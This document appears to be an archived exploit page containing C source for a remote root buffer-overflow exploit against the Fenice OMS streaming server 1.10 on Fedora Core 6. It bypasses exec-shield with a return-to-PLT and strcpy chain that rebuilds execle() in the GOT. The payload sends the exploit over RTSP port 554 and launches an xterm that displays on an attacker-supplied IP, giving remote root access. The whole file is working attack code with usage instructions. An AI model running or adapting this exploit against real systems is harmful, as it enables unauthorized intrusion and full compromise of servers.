<html><head><title>Fenice OMS server 1.10 Remote Buffer Overflow Exploit (exec-shield)</title></head><pre>/*
**
** Fedora Core 6 (exec-shield) based
** Fenice OMS server (fenice-1.10.tar.gz) remote root exploit
** by Xpl017Elz
**
** Advanced exploitation in exec-shield (Fedora Core case study)
** URL: http://x82.inetcop.org/h0me/papers/FC_exploit/FC_exploit.txt
**
** Reference: http://www.securityfocus.com/bid/17678
** vendor: http://streaming.polito.it/legacy_server
**
** --
** exploit by &quot;you dong-hun&quot;(Xpl017Elz), &lt;szoahc@hotmail.com&gt;.
** My World: http://x82.inetcop.org
**
*/
/*
** -=-= POINT! POINT! POINT! POINT! POINT! =-=-
**
** This is a very common standalone daemon remote buffer overflow vulnerability.
** I used the method that I used on my proftpd exploit again to avoid random mapping library.
** And I'm plainning to publish it in English.
**
** http://x82.inetcop.org/h0me/papers/FC_exploit/FC_oneshot_exploit.txt
**
** Kaveh Razavi's exploit uses about 750Kb and mine uses 115Kb more.
**
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;


#define UNAME_PLT 0x8048e9c // &lt;uname@plt&gt; // randomÇÏ°Ô mappingµÇ´Â (execle()&gt;&gt;16)&amp;0xff GOT 1byte¸¦ È®º¸ÇÏ±â À§ÇØ

#define STRCPY_PLT 0x08048ffc // &lt;strcpy@plt&gt;
#define MOVE_ESP 0x80569e5 // &lt;__do_global_ctors_aux+37&gt;:   pop    %ebx // retÀ» Æ÷ÇÔ ÃÑ 12byte ÀÌµ¿ (nergal's idea)

#define GETGID_GOT 0x8059234 // execle() ÇÔ¼ö ÁÖ¼Ò¸¦ ÀÓÀÇ·Î Á¶ÇÕÇÏ¿© ³ÖÀ» GOT ÁÖ¼Ò
/*
	(gdb) x/x 0x8059234
	0x8059234 &lt;_GLOBAL_OFFSET_TABLE_+324&gt;:  0x08049222
	(gdb) x 0x08049222
	0x8049222 &lt;getgid@plt+6&gt;:       0x00027068
	(gdb)
*/
#define GETGID_PLT	0x0804921c // &lt;getgid@plt&gt; // GOT Á¶ÇÕ ÀÌÈÄ, PLT¸¦ ÅëÇØ execle() ÇÔ¼ö ÇÚµé¸µ


#define EXECLE_16_0xff	0x8059156 // (execle()&gt;&gt;16)&amp;0xff // uname ÇÔ¼öÀÇ 1byte: 0x!!0000
#define EXECLE_08_0xff	0x80591b5 // (execle()&gt;&gt;8)&amp;0xff // bind ÇÔ¼öÀÇ 1byte: 0x00!!00
#define EXECLE_00_0xff	0x8048e83 // (execle()&gt;&gt;0)&amp;0xff // ³ª¸ÓÁö Á¤ÀûÀÎ 1byte: 0x0000!!


/* Á¤ÀûÀ¸·Î Á¢±Ù °¡´ÉÇÑ ¹öÆÛ°¡ ÀÖÀ» °æ¿ì, ÇÊ¿ä ¾øÀ½ */
#define DATA_LOC 0x805af4c // heap ºó °ø°£À» ÀÌ¿ë


/* /usr/X11R6/bin/xterm */
#define ARG1_LOC	0x805af4c // Á¶ÇÕµÈ ¸í·É ½ÃÀÛ ÁÖ¼Ò (argv[0],argv[1]·Î ¾²ÀÓ)
#define SLASH_STR	0x8055acb // &quot;/&quot;
#define XTERM_STR_1	0x804875d // &quot;us&quot;
#define XTERM_STR_2	0x80585ce // &quot;r/&quot;
#define X_STR_1		0x8048df3 // &quot;X&quot;
#define R_STR		0x804a572 // &quot;R&quot;
#define XTERM_STR_3	0x804882c // &quot;bin&quot;
#define X_STR_2		0x8048e33 // &quot;x&quot;
#define XTERM_STR_4	0x8056a33 // &quot;term&quot;


/* -display */
#define ARG2_LOC	0x805af61 // Á¶ÇÕµÈ ¿É¼Ç ½ÃÀÛ ÁÖ¼Ò (argv[2]·Î ¾²ÀÓ)
#define DISPLAY_OPTION	0x80584b8 // &quot;-di&quot;


/* xhost_ip:0 */
#define ARG3_LOC	0x805af65 // Á¶ÇÕµÈ xhost IP ½ÃÀÛ ÁÖ¼Ò (argv[3]À¸·Î ¾²ÀÓ)
#define NUM_0		0x8053285 // &quot;0&quot;
#define NUM_1		0x804ef17 // &quot;1&quot;
#define NUM_2		0x804b37b // &quot;2&quot;
#define NUM_3		0x804d622 // &quot;3&quot;
#define NUM_4		0x804e583 // &quot;4&quot;
#define NUM_5		0x80554d7 // &quot;5&quot;
#define NUM_6		0x8052341 // &quot;6&quot;
#define NUM_7		0x804d14a // &quot;7&quot;
#define NUM_8		0x8048db3 // &quot;8&quot;
#define NUM_9		0x80516bb // &quot;9&quot;


#define COLON_STR 0x8057abb // &quot;:&quot;
#define NULL_STR 0x805afbe // 0x00000000


int main(int argc,char *argv[]){
	int i=0,j=0;
	struct hostent *se;
	struct sockaddr_in saddr;
	unsigned long ip,ip1,ip2,ip3,ip4;
	unsigned char do_ex[4096];
	unsigned char xhost_ip[256];
	int sock;
	char host[256];
	int port=554;

	memset((char *)do_ex,0,sizeof(do_ex));
	ip=ip1=ip2=ip3=ip4;


	printf(&quot;/*\n**\n** Fedora Core 6 (exec-shield) based\n&quot;
		&quot;** Fenice OMS server (fenice-1.10.tar.gz) remote root exploit\n&quot;
		&quot;** by Xpl017Elz\n**\n&quot;);
	if(argc&lt;2){
		printf(&quot;** Usage: %s [host] [port] [xhost ip]\n&quot;,argv[0]);
		printf(&quot;**\n** host: Fenice 1.10 Open Media Streaming Server\n&quot;);
		printf(&quot;** port: default 554\n&quot;);
		printf(&quot;** xhost ip: attacker xhost\n**\n&quot;);
		printf(&quot;** Example: %s fenice.omss.co.kr 554 82.82.82.82\n**\n*/\n&quot;,argv[0]);
		exit(-1);
	}
	else {
		sscanf(argv[3],&quot;%d.%d.%d.%d&quot;,&amp;ip1,&amp;ip2,&amp;ip3,&amp;ip4);
#define IP1 16777216
#define IP2 65536
#define IP3 256
		ip=0;
		ip+=ip1 * (IP1);
		ip+=ip2 * (IP2);
		ip+=ip3 * (IP3);
		ip+=ip4;

		memset((char *)xhost_ip,0,256);
		sprintf(xhost_ip,&quot;%10lu&quot;,ip);
	}

	memset((char *)host,0,sizeof(host));
	strncpy(host,argv[1],sizeof(host)-1);
	port=atoi(argv[2]);

	se=gethostbyname(host);
	if(se==NULL){
		printf(&quot;** gethostbyname() error\n**\n*/\n&quot;);
		return -1;
	}
	sock=socket(AF_INET,SOCK_STREAM,0);
	if(sock==-1){
		printf(&quot;** socket() error\n**\n*/\n&quot;);
		return -1;
	}

	saddr.sin_family=AF_INET;
	saddr.sin_port=htons(port);
	saddr.sin_addr=*((struct in_addr *)se-&gt;h_addr);
	bzero(&amp;(saddr.sin_zero),8);


	printf(&quot;** make exploit\n&quot;);
	sprintf(do_ex,&quot;GET /&quot;);
	j=strlen(do_ex);
	for(i=0;i&lt;320;i++,j++){
		sprintf(do_ex+j,&quot;A&quot;);
	}

#define __GOGOSSING(dest,index,src){\
	*(long *)&amp;dest[index]=src;\
	index+=4;\
}

	__GOGOSSING(do_ex,j,UNAME_PLT); /* uname GOT °ª Ã¤¿ò */
	// execle() ÁÖ¼Ò Á¶ÇÕ
	{
		i=0;
		/* (execle()&gt;&gt;0)&amp;0xff */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,GETGID_GOT+i++);
		__GOGOSSING(do_ex,j,EXECLE_00_0xff);
		/* (execle()&gt;&gt;8)&amp;0xff */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,GETGID_GOT+i++);
		__GOGOSSING(do_ex,j,EXECLE_08_0xff);
		/* (execle()&gt;&gt;16)&amp;0xff */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,GETGID_GOT+i++);
		__GOGOSSING(do_ex,j,EXECLE_16_0xff);
	}
	// argv[0],argv[1]: /usr/X11R6/bin/xterm
	{
		i=0;
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,SLASH_STR);
		i+=1; /* &quot;/&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,XTERM_STR_1);
		i+=2; /* &quot;us&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,XTERM_STR_2);
		i+=2; /* &quot;r/&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,X_STR_1);
		i+=1; /* &quot;X&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NUM_1);
		i+=1; /* &quot;1&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NUM_1);
		i+=1; /* &quot;1&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,R_STR);
		i+=1; /* &quot;R&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NUM_6);
		i+=1; /* &quot;6&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,SLASH_STR);
		i+=1; /* &quot;/&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,XTERM_STR_3);
		i+=3; /* &quot;bin&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,SLASH_STR);
		i+=1; /* &quot;/&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,X_STR_2);
		i+=1; /* &quot;x&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,XTERM_STR_4);
		i+=4; /* &quot;term&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NULL_STR);
		i+=1; /* null */
	}
	// argv[2]: -display
	{
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,DISPLAY_OPTION);
		i+=3; /* &quot;-di&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NULL_STR);
		i+=1; /* null */
	}
	// argv[3]: xhost_ip:0
	for(ip=0;ip&lt;10;ip++){
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);

		switch(xhost_ip[ip]){
			case '0':
				__GOGOSSING(do_ex,j,NUM_0);
				break;
			case '1':
				__GOGOSSING(do_ex,j,NUM_1);
				break;
			case '2':
				__GOGOSSING(do_ex,j,NUM_2);
				break;
			case '3':
				__GOGOSSING(do_ex,j,NUM_3);
				break;
			case '4':
				__GOGOSSING(do_ex,j,NUM_4);
				break;
			case '5':
				__GOGOSSING(do_ex,j,NUM_5);
				break;
			case '6':
				__GOGOSSING(do_ex,j,NUM_6);
				break;
			case '7':
				__GOGOSSING(do_ex,j,NUM_7);
				break;
			case '8':
				__GOGOSSING(do_ex,j,NUM_8);
				break;
			case '9':
				__GOGOSSING(do_ex,j,NUM_9);
				break;
		}
		i+=1;
	}
	{
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,COLON_STR);
		i+=1; /* &quot;:&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NUM_0);
		i+=1; /* &quot;0&quot; */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NULL_STR);
		i+=1; /* null */
	}
	// exploit
	{
		__GOGOSSING(do_ex,j,GETGID_PLT); // getgidÀÇ GOT´Â execle() ÇÔ¼ö¸¦ °¡Áö¹Ç·Î, PLT·Î ÇÚµé¸µ °¡´É.
		__GOGOSSING(do_ex,j,0x82828282); // callÀÌ ¾Æ´Ï¹Ç·Î, ÀÌÀü ÇÔ¼ö %eip¸¦ ´ë½ÅÇØ¼­ Ã¤¿ò.
		__GOGOSSING(do_ex,j,ARG1_LOC); /* argv[0] */
		__GOGOSSING(do_ex,j,ARG1_LOC); /* argv[1] */
		__GOGOSSING(do_ex,j,ARG2_LOC); /* argv[2] */
		__GOGOSSING(do_ex,j,ARG3_LOC); /* argv[3] */
	}
	printf(&quot;** exploit size: %d\n&quot;,strlen(do_ex));

	i=connect(sock,(struct sockaddr *)&amp;saddr,sizeof(struct sockaddr));
	if(i==-1){
		printf(&quot;** connect() error\n**\n*/\n&quot;);
		return -1;
	}
	else {
		printf(&quot;** send exploit\n&quot;);
		send(sock,do_ex,j,0);

		printf(&quot;** sleepppppppp...\n&quot;);
		sleep(1);
		send(sock,&quot;\n&quot;,1,0);
		send(sock,&quot;\n&quot;,1,0);
	}
	close(sock);

	printf(&quot;** xhost, check it up, now!\n**\n*/\n&quot;);
	exit(0);
}

/* eoc */

// milw0rm.com [2007-04-29]</pre></html>